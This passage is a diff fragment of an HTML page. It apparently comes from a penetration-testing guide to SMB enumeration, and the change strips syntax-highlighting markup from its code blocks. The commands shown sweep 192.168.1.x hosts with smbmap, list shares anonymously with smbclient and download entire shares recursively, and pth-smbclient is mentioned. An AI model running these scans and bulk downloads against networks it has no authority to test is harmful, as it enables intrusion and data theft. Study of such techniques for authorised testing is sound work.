-<span class="w">  </span>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-q<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;^</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span>
-<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== Detailed scan on </span><span class="nv">$host</span><span class="s2"> ===&quot;</span>
-<span class="w">    </span>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-R<span class="w"> </span>-q<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<span class="w">  </span><span class="o">}</span>
-<span class="k">done</span>
+for host in 192.168.1.{50..100}; do
+  echo &quot;[*] Scanning $host&quot;
+  smbmap -H $host -q 2&gt;/dev/null | grep -v &quot;^$&quot; &amp;&amp; {
+    echo &quot;=== Detailed scan on $host ===&quot;
+    smbmap -H $host -R -q 2&gt;/dev/null
+  }
+done
 </code></pre>
 </div>
 
@@ -714,28 +703,28 @@ pth-smbclient<span class="w"> </span>//192.168.1.100/share1<span class="w"> </sp
 <h3 id="quick-reference-one-liners">Quick Reference One-Liners</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># List all shares:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N
+<pre><code># List all shares:
+smbclient -L 192.168.1.100 -N
 
-<span class="c1"># Check permissions on all shares:</span>
-smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100
+# Check permissions on all shares:
+smbmap -H 192.168.1.100
 
-<span class="c1"># Download file directly:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;get file.txt&quot;</span>
+# Download file directly:
+smbclient //192.168.1.100/share -N -c &quot;get file.txt&quot;
 
-<span class="c1"># Download entire share:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;recurse on; mget *&quot;</span>
+# Download entire share:
+smbclient //192.168.1.100/share -N -c &quot;recurse on; mget *&quot;
 
-<span class="c1"># Find readable shares:</span>
-smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;READ&quot;</span>
+# Find readable shares:
+smbclient -L 192.168.1.100 -N | grep &quot;READ&quot;
 
-<span class="c1"># Connect and stay interactive:</span>
-smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N
+# Connect and stay interactive:
+smbclient //192.168.1.100/share -N
 
-<span class="c1"># Scan network for SMB:</span>
-<span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">192</span>.168.1.<span class="o">{</span><span class="m">1</span>..255<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>timeout<span class="w"> </span><span class="m">0</span>.1<span class="w"> </span>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-q<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$host</span><span class="s2">: SMB OPEN&quot;</span>
-<span class="k">done</span>
+# Scan network for SMB:
+for host in 192.168.1.{1..255}; do
+  timeout 0.1 smbmap -H $host -q 2&gt;/dev/null &amp;&amp; echo &quot;$host: SMB OPEN&quot;
+done
 </code></pre>
 </div>
 
